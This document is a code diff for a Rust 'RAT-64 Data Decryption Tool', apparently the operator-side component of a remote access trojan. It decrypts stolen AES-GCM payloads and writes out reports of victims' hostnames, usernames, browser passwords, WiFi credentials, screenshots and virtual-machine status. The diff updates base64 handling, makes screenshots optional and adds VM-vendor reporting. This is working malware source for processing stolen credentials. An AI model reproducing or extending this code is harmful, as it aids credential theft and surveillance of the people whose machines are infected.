@@ -4,19 +4,11 @@ use std::fs;
 use std::path::Path;
 
 use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::Aead};
-use base64::{engine::general_purpose::STANDARD, Engine};
+use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
 use rmp_serde::decode::from_slice as from_msgpack_slice;
-use serde_json;
 
 // データ構造体のインポート
-use rat_64::{SystemInfo, AuthData, ScreenshotData};
-
-#[derive(serde::Deserialize)]
-struct FullData {
-    system_info: SystemInfo,
-    auth_data: AuthData,
-    screenshot_data: ScreenshotData,
-}
+use rat_64::{IntegratedPayload, ScreenshotData};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args: Vec<String> = env::args().collect();
@@ -38,16 +30,20 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let nonce_str = &args[2];
     let data_file = if args.len() > 3 { &args[3] } else { "data.dat" };
     
-    println!("🔐 RAT-64 Data Decryption Tool");
-    println!("📄 Target file: {}", data_file);
+    println!("RAT-64 Data Decryption Tool");
+    println!("Target file: {}", data_file);
     
-    // Base64デコード
-    let key = STANDARD.decode(key_str)
+    // Base64デコード (パディングなし形式)
+    println!("Decoding Base64 key and nonce...");
+    let key = STANDARD_NO_PAD.decode(key_str)
         .map_err(|e| format!("Invalid key Base64: {}", e))?;
-    let nonce = STANDARD.decode(nonce_str)
+    let nonce = STANDARD_NO_PAD.decode(nonce_str)
         .map_err(|e| format!("Invalid nonce Base64: {}", e))?;
     
     // キーとナンスの長さを検証
+    println!("Key length: {} bytes", key.len());
+    println!("Nonce length: {} bytes", nonce.len());
+    
     if key.len() != 32 {
         return Err(format!("Invalid key length: {} (expected 32 bytes)", key.len()).into());
     }
@@ -55,6 +51,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     if nonce.len() != 12 {
         return Err(format!("Invalid nonce length: {} (expected 12 bytes)", nonce.len()).into());
     }
+    
+    println!("Key and nonce validation successful");
     
     let key_array: [u8; 32] = key.try_into().unwrap();
     let nonce_array: [u8; 12] = nonce.try_into().unwrap();
@@ -66,7 +64,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 fn print_usage() {
-    println!("🔐 RAT-64 Data Decryption Tool");
+    println!("RAT-64 Data Decryption Tool");
     println!();
     println!("Usage:");
     println!("  decrypt.exe <key_base64> <nonce_base64> [data_file]");
@@ -87,7 +85,7 @@ fn print_usage() {
 
 
 fn decrypt_and_save(data_file: &str, key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Box<dyn std::error::Error>> {
-    println!("🔓 Decrypting data...");
+    println!("Decrypting data...");
     
     if !Path::new(data_file).exists() {
         return Err(format!("Data file '{}' not found", data_file).into());
@@ -95,22 +93,25 @@ fn decrypt_and_save(data_file: &str, key: &[u8; 32], nonce: &[u8; 12]) -> Result
     
     // 暗号化されたデータを読み込み
     let encrypted_data = fs::read(data_file)?;
+    println!("Encrypted data size: {} bytes", encrypted_data.len());
     
     // 復号化
+    println!("Creating AES-256-GCM cipher...");
     let cipher = Aes256Gcm::new_from_slice(key)
         .map_err(|e| format!("Invalid key: {}", e))?;
-    let nonce = Nonce::from_slice(nonce);
+    let nonce_gcm = Nonce::from_slice(nonce);
     
-    let decrypted_data = cipher.decrypt(nonce, encrypted_data.as_slice())
+    println!("Attempting decryption...");
+    let decrypted_data = cipher.decrypt(nonce_gcm, encrypted_data.as_slice())
         .map_err(|e| format!("Decryption failed: {}", e))?;
     
-    println!("✅ Decryption successful!");
+    println!("Decryption successful!");
     
     // MessagePackデータをデシリアライズ
-    let full_data: FullData = from_msgpack_slice(&decrypted_data)
+    let full_data: IntegratedPayload = from_msgpack_slice(&decrypted_data)
         .map_err(|e| format!("MessagePack deserialization failed: {}", e))?;
     
-    println!("📊 Parsing data structure...");
+    println!("Parsing data structure...");
     
     // 出力ファイル名を生成
     let base_name = Path::new(data_file).file_stem().unwrap().to_str().unwrap();
@@ -124,7 +125,9 @@ fn decrypt_and_save(data_file: &str, key: &[u8; 32], nonce: &[u8; 12]) -> Result
     fs::write(format!("{}/system_info.json", output_dir), json_output)?;
     
     // スクリーンショットデータを保存
-    save_screenshot_data(&output_dir, &full_data.screenshot_data)?;
+    if let Some(ref screenshot_data) = full_data.screenshot_data {
+        save_screenshot_data(&output_dir, screenshot_data)?;
+    }
     
     // 統合レポートファイルを作成
     create_unified_report(&output_dir, &full_data)?;
@@ -139,7 +142,7 @@ fn decrypt_and_save(data_file: &str, key: &[u8; 32], nonce: &[u8; 12]) -> Result
     Ok(())
 }
 
-fn create_unified_report(output_dir: &str, full_data: &FullData) -> Result<(), Box<dyn std::error::Error>> {
+fn create_unified_report(output_dir: &str, full_data: &IntegratedPayload) -> Result<(), Box<dyn std::error::Error>> {
     let mut report = String::new();
     
     // ヘッダー
@@ -148,7 +151,7 @@ fn create_unified_report(output_dir: &str, full_data: &FullData) -> Result<(), B
     report.push_str("===============================================\n\n");
     
     // システム情報セクション
-    report.push_str("🖥️  SYSTEM INFORMATION\n");
+    report.push_str("SYSTEM INFORMATION\n");
     report.push_str("===============================================\n");
     report.push_str(&format!("Hostname: {}\n", full_data.system_info.hostname));
     report.push_str(&format!("Username: {}\n", full_data.system_info.username));
@@ -164,56 +167,70 @@ fn create_unified_report(output_dir: &str, full_data: &FullData) -> Result<(), B
     }
     report.push_str(&format!("Timezone: {}\n", full_data.system_info.timezone));
     report.push_str(&format!("Locale: {}\n", full_data.system_info.locale));
+    let vm_text = if full_data.system_info.is_virtual_machine {
+        match &full_data.system_info.virtual_machine_vendor {
+            Some(v) if !v.is_empty() => format!("{}", v),
+            _ => "Yes".to_string(),
+        }
+    } else {
+        "No".to_string()
+    };
+    report.push_str(&format!("Virtual machine: {}\n", vm_text));
     report.push_str(&format!("Uptime: {:.2} hours\n", full_data.system_info.uptime_hours));
-    report.push_str("\n");
+    report.push('\n');
     
     // 認証データセクション
-    report.push_str("🔐 AUTHENTICATION DATA\n");
+    report.push_str("AUTHENTICATION DATA\n");
     report.push_str("===============================================\n");
     
     // ブラウザパスワード
     if !full_data.auth_data.passwords.is_empty() {
-        report.push_str(&format!("📋 BROWSER PASSWORDS ({} entries)\n", full_data.auth_data.passwords.len()));
+        report.push_str(&format!("BROWSER PASSWORDS ({} entries)\n", full_data.auth_data.passwords.len()));
         report.push_str("-----------------------------------------------\n");
         for (i, password) in full_data.auth_data.passwords.iter().enumerate() {
             report.push_str(&format!("{}. {}\n", i + 1, password));
         }
-        report.push_str("\n");
+        report.push('\n');
     } else {
-        report.push_str("📋 BROWSER PASSWORDS: No entries found\n\n");
+        report.push_str("BROWSER PASSWORDS: No entries found\n\n");
     }
     
     // WiFi認証情報
     if !full_data.auth_data.wifi_creds.is_empty() {
-        report.push_str(&format!("📶 WIFI CREDENTIALS ({} entries)\n", full_data.auth_data.wifi_creds.len()));
+        report.push_str(&format!("WIFI CREDENTIALS ({} entries)\n", full_data.auth_data.wifi_creds.len()));
         report.push_str("-----------------------------------------------\n");
         for (i, wifi_cred) in full_data.auth_data.wifi_creds.iter().enumerate() {
             report.push_str(&format!("{}. {}\n", i + 1, wifi_cred));
         }
-        report.push_str("\n");
+        report.push('\n');
     } else {
-        report.push_str("📶 WIFI CREDENTIALS: No entries found\n\n");
+        report.push_str("WIFI CREDENTIALS: No entries found\n\n");
     }
     
     // スクリーンショット情報セクション
-    report.push_str("📸 SCREENSHOT INFORMATION\n");
+    report.push_str("SCREENSHOT INFORMATION\n");
     report.push_str("===============================================\n");
-    report.push_str(&format!("Capture time: {}\n", full_data.screenshot_data.capture_time));
-    report.push_str(&format!("Total displays: {}\n", full_data.screenshot_data.total_count));
-    report.push_str(&format!("Primary display: {}\n", 
-        if full_data.screenshot_data.primary_display.is_some() { "Available" } else { "Not available" }));
-    report.push_str(&format!("All displays captured: {}\n", full_data.screenshot_data.all_displays.len()));
-    report.push_str("Note: Screenshots are saved as PNG files in screenshots/ directory\n");
-    report.push_str("\n");
+    if let Some(ref screenshot_data) = full_data.screenshot_data {
+        report.push_str(&format!("Capture time: {}\n", screenshot_data.capture_time));
+        report.push_str(&format!("Total displays: {}\n", screenshot_data.total_count));
+        report.push_str(&format!("Primary display: {}\n", 
+            if screenshot_data.primary_display.is_some() { "Available" } else { "Not available" }));
+        report.push_str(&format!("All displays captured: {}\n", screenshot_data.all_displays.len()));
+        report.push_str("Note: Screenshots are saved as PNG files in screenshots/ directory\n");
+    } else {
+        report.push_str("No screenshot data available\n");
+    }
+    report.push('\n');
     
     // データサマリー
-    report.push_str("📊 DATA SUMMARY\n");
+    report.push_str("DATA SUMMARY\n");
     report.push_str("===============================================\n");
     report.push_str(&format!("Total browser passwords: {}\n", full_data.auth_data.passwords.len()));
     report.push_str(&format!("Total WiFi credentials: {}\n", full_data.auth_data.wifi_creds.len()));
-    report.push_str(&format!("Total screenshots: {}\n", full_data.screenshot_data.total_count));
-    report.push_str(&format!("System information: Complete\n"));
-    report.push_str("\n");
+    report.push_str(&format!("Total screenshots: {}\n", 
+        full_data.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0)));
+    report.push_str("System information: Complete\n");
+    report.push('\n');
     
     // フッター
     report.push_str("===============================================\n");
@@ -259,7 +276,8 @@ fn save_screenshot_base64(base64_data: &str, filename: &str) -> Result<(), Box<d
         return Err("Empty screenshot data".into());
     }
     
-    let image_data = STANDARD.decode(base64_data)?;
+    // スクリーンショットは通常のBase64エンコード（パディング付き）を使用
+    let image_data = base64::engine::general_purpose::STANDARD.decode(base64_data)?;
     fs::write(filename, image_data)?;
     
     Ok(())
